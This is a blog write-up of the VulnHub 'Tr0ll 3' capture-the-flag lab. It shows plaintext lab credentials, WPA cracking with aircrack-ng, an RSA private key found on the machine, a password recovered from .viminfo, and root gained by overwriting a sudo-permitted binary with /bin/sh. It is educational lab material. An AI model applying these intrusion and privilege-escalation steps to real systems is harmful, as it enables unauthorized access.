---
layout: post
title: "There be Tr0lls - Part 3"
date: 2019-09-09 19:35:37 +0300
comments: true
categories: [penetration testing, writeups]
keywords: tr0ll 3, pentest lab, vulnhub, ctf, boot2root, tr0ll
description: Tr0ll 3 writeup
---

The Tr0ll is back with the 3rd machine in the series!

<!-- more -->

## start with credentials in plaintext

The start is atypical..the machine only has the SSH port open, and in the author description we are told to <code>start:here</code> for the login..so let's try to SSH with these credentials. It works and we are in right away.

```
start@Tr0ll3:~$ ls
bluepill  redpill
```

If you take the bluepill, you are being taught the secrets of how to make a hacker waste time.

```
start@Tr0ll3:~/bluepill$ cat awesome_work
http://bfy.tw/ODa
```

With the redpill, we find a password..or we're being trolled:

```
start@Tr0ll3:~/redpill$ cat this_will_surely_work
step2:Password1!
```

Jumping straight into enumeration with LinEnum, we notice there are many potentially interesting users on the system:

```
maleus
wytshadow
genphlux
eagle
```

When searching for world writable files, we find the following:

```
-] Files not owned by user but writable by group:
-rwxrwxrwx 1 root root 49962 Aug  2 00:23 /var/log/.dist-manage/wytshadow.cap
-rwxrwxrwx 1 eagle russ 35737600 Aug  2 00:24 /.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
```

We also find possible credentials for the eagle user among the files owned by the start user:

```
start@Tr0ll3:~$ cat /home/start/.../about_time
eagle:oxxwJo
```

I transferred the capture file to my machine, also checked the contents of that troll file, it was filled with blocks of strings like these:

```
QBu4rIhKXJ
DKbpcZQpO3
T7JUfO0jjZ
```

Before looking at the exfiltrated file, I switched to the user eagle with the above password.

## Be the eagle - wireless traffic cracking

The packet capture file contains wireless traffic, so I thought about cracking it with aircrack-ng. For the first attempt, I fed it the gold_star.txt file as wordlist, and it found the passphrase in 5 minutes:

```
aircrack-ng -w gold_star.txt wytshadow.cap
[...]
KEY FOUND! [ gaUoCe34t1 ]
```

There was nothing particularly interesting from eagle's point of view, other than the sudo privilege for starting the vsftpd service:

```
User eagle may run the following commands on Tr0ll3:
    (root) /usr/sbin/service vsftpd start
```

We keep this option on the bench for now, since we have something else to work with. We know there's a wytshadow user, and the .cap file had the same name, so I used the key as password for this account and new user, new shell!

## wytshadow and the Lynx

Inside the home directory we find a SUID executable:

```
-rwsrwxrwx  1 genphlux  root      8566 Jun 17  2015 oohfun
wytshadow@Tr0ll3:~$ file oohfun
oohfun: setuid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=309f4fec949b0e2eb3f6ec83ccadff89c553e397, not stripped
```

If we run it, we see the string "iM Cr@zY L1k3 AAA LYNX" printed continuously on the screen. If we look in the strings of the file, we see a reference to a shell script:

```
/lol/bin/run.sh -b 0.0.0.0
```

If we look at that file, we see it does exactly what we saw earlier, printing the string in an infinite loop:

```
wytshadow@Tr0ll3:~$ cat /lol/bin/run.sh
#!/bin/sh
while true;do echo "iM Cr@zY L1k3 AAA LYNX"; done
```

We don't have permissions to further enumerate the /lol directory. I checked the sudo privileges, and this user can start an Nginx server:

```
User wytshadow may run the following commands on Tr0ll3:
    (root) /usr/sbin/service nginx start
```

The server is listening on port 8080, but we get a 403 Forbidden error when trying to access it.

```
roto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
```

If we look in the Nginx configuration files, we find the server expects a user agent of Lynx, and now it all makes sense. Lynx is a CLI browser.

```
wytshadow@Tr0ll3:~$ cat /etc/nginx/sites-available/default
if ($http_user_agent !~ "Lynx*"){
    return 403;
```

I already had it on Kali, so I used it to browse to the newly opened web server and was handed the credentials for the genphlux user:

```
lynx http://192.168.159.143:8080/
genphlux:HF9nd0cR!
```

## genphlux - Unprotected SSH keys

Inside the home directory we immediately find the SSH private key of the maleus user!

```
genphlux@Tr0ll3:~$ cat maleus
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
-----END RSA PRIVATE KEY-----
```

I was curious about what was inside /lol, it appears to be a JBoss installation:

```
genphlux@Tr0ll3:/lol$ ls
bin  client  common  copyright.txt  docs  jar-versions.xml  JBossORG-EULA.txt  lgpl.html  lib  readme.html  server
```

genphlux can also start an Apache server:

```
User genphlux may run the following commands on Tr0ll3:
(root) /usr/sbin/service apache2 start
```

I started the server, also getting a 403 Forbidden, lynx or not. Moving on for now, I SSH'ed in as maleus with the found private key.

## maleus - don't even bother

Inside his home we find another binary:

```
maleus@Tr0ll3:~$ file dont_even_bother
dont_even_bother: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.24, BuildID[sha1]=455a77b2503f19c1a09cbc9b66d513b2fa3af73c, not stripped
```

This binary asks for a password:

```
maleus@Tr0ll3:~$ ./dont_even_bother

 Enter the password :
das

 Wrong Password
```

And in the strings we find a message for finding the correct password probably:

```
 Your reward is just knowing you did it! :-P
```

This reward isn't really that enticing, so I didn't jump into reversing this, it might be a troll dead end. I continued looking through the home folder and found a possible password inside the *.viminfo* file:

```
# Registers:
""1	LINE	0
 passwd
"2	LINE	0
 B^slc8I$
"3	LINE	0
 passswd
```

In the .viminfo file you can find information that persists throughout vim runs. If you don't disable the vim logging, you can expect to find things you typed / pasted / edited, like passwords in this case. A useful blog that describes this in more detail is http://technotes.whw1.com/computer-related/development/programming/58-how-to-stop-vim-logging-info-into-viminfo

The password belongs to maleus and now we can check his sudo privileges. We find out he can run the executable from earlier as root:

```
User maleus may run the following commands on Tr0ll3:
    (root) /home/maleus/dont_even_bother
```

From the strings, we already assume the executable itself is just a troll. However, maleus has write privileges over this file:

```
maleus@Tr0ll3:~$ ls -l
total 12
-rwxrwxr-x 1 maleus maleus 8674 Jun 18  2015 dont_even_bother
```

So we can just replace this useless binary with one that would give us a root shell:

```
maleus@Tr0ll3:~$ cat /bin/sh > dont_even_bother
maleus@Tr0ll3:~$ sudo ./dont_even_bother
[sudo] password for maleus:
# cat /root/flag.txt
You are truly a Jedi!

Twitter Proof:

Pr00fThatTh3L33tHax0rG0tTheFl@g!!

@Maleus21
```

This was another fun machine in the series. In the end, we trolled the troll again!

``` 
 ________________________________________
/ QOTD:                                  \
|                                        |
\ All I want is more than my fair share. /
 ----------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

